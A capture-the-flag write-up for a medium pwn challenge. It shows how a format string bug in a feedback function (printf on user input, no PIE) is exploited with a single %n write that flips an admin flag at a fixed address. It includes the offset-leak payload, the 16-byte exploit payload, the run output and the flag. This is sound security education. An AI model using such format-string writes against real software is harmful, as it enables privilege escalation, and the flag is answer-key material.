# Manifest Destiny — Pwn (Medium)

**Flag:** `H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}`

## Challenge

Sparrow Freight's terminal keeps the cargo manifest behind admin privileges. We are just a walk-in visitor, but the
terminal "loves feedback and takes to heart everything you say". Objective: escalate to "management" and read the
manifest.

## Initial Analysis

`manifest.zip` gives the binary + exactly `libc.so.6` (glibc 2.39, Ubuntu 24.04) + the loader.
Triage with `scripts/triage.cjs`:

```
ELF 64-bit, type=ET_EXEC (no PIE), interpreter=/lib64/ld-linux-x86-64.so.2
PIE=no  RELRO=yes  STACK=non-exec (NX on)
keyword: admin
```

No PIE is the most important detail: the privilege variable lives at a fixed address, so the format string needs a
single write and nothing else - no leak, no ROP.

Breaking down the three main functions:

```
main:      fgets(16) -> atoi;  1 -> feedback(), 2 -> view_manifest(), còn lại -> return
feedback:  char buf[] at rbp-0xd0; memset; read(0, buf, 0xc7);
           printf("You said: ");  printf(buf);      <-- lỗi ở đây
view_manifest:
           if (!is_admin) puts("[!] admin clearance required.");
           else fopen(flag_file,"r"); fgets(128); printf("[manifest] clearance code: %s", buf);
```

`is_admin` is a `DWORD` at `0x40407c` (`.bss`).

The crucial layout point: `feedback` does `push rbp; mov rbp,rsp; sub rsp,0xd0`, so the buffer sits exactly at `rsp`.
When `call printf` executes, the first 6 arguments travel through registers (rdi is the format string, rsi/rdx/rcx/r8/r9
are varargs 1-5), and vararg 6 onward is read from the stack immediately above the return address - i.e. exactly
`buf+0`. Hence:

- `buf+0` is argument number 6 (`%6$`)
- `buf+8` is argument number 7 (`%7$`)

## Exploit Chain

**Step 1 - Confirming the buffer position with a leak.** Send `MARKER-%6$p-%7$p-...`:

```
You said: MARKER-0x252d52454b52414d-0x702437252d702436-...
```

`0x252d52454b52414d` is exactly the 8 bytes of `"MARKER-%"` read backwards (little-endian) -> buf+0 == argument 6,
just as inferred from the disassembly. This step is cheap and removes all guesswork about the offset.

**Step 2 - Put the address at buf+8 and write with `%7$n`.**

A 16-byte payload:

```
"CCCC"  +  "%7$n"  +  p64(0x40407c)
 0..3       4..7        8..15
```

**Step 3 - The trap that was hit: `%n` writes 0.** The first attempt left `%7$n` at the very start of the buffer
(`"%7$n" + b"AA" + addr`) - it ran without crashing, but `is_admin` stayed 0 and the manifest refused.
A double reason:

- `%n` writes the number of characters printed so far; if `%n` comes first, that number is 0.
- at the same time the 2 padding bytes move the address to offset 6 instead of 8, off from `buf+8`.

Fixed by swapping the order: 4 printable characters placed first (`CCCC`), `%7$n` at offset 4-7,
the address landing exactly at buf+8. Now `%n` writes the value 4 - non-zero is enough to pass `test eax,eax`.

**Step 4 - Read the manifest.** Choose `2`:

```
[manifest] clearance code: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
```

## Flag
```bash
python exploit.py pwn.h7tex.com 42506
```

```
[*] prompt: Leave feedback for the terminal operators:
[*] echo: b'You said: CCCC|@@\n\n1) leave feedback\n...'
[*] manifest: [manifest] clearance code: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
[+] FLAG: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
```
